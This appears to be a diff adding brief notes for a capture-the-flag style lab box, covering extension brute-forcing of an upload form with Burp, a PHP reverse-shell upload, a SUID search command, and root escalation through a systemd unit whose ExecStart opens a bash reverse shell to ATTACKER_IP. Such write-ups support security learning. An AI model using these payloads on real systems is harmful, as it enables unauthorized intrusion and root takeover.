@@ -1,0 +1,42 @@
+
+
+Scan the box, find squid and httpd (3333)
+
+Find upload form http://BOX_IP:3333/internal/index.php
+
+Find allowed extension via Snipe attack
+
+When "Snipe" attack with Burp, remember to uncheck: URL-encode these characters
+
+Upload reverse shell
+
+Listen to nc on attacker machine
+
+Execute shell http://BOX_IP:3333/internal/upload/rev_shell.phtml
+
+Bill is the sysadmin
+
+To find SUID binaries: find / -perm -4000 -type f 2>/dev/null
+
+Binary: /bin/systemctl
+
+https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+
+
+root.service
+-------------------------------------------------------------------------
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+-------------------------------------------------------------------------
+
+Upload the file either via python http server or nc
+
+Listen to port 9999 on attacker
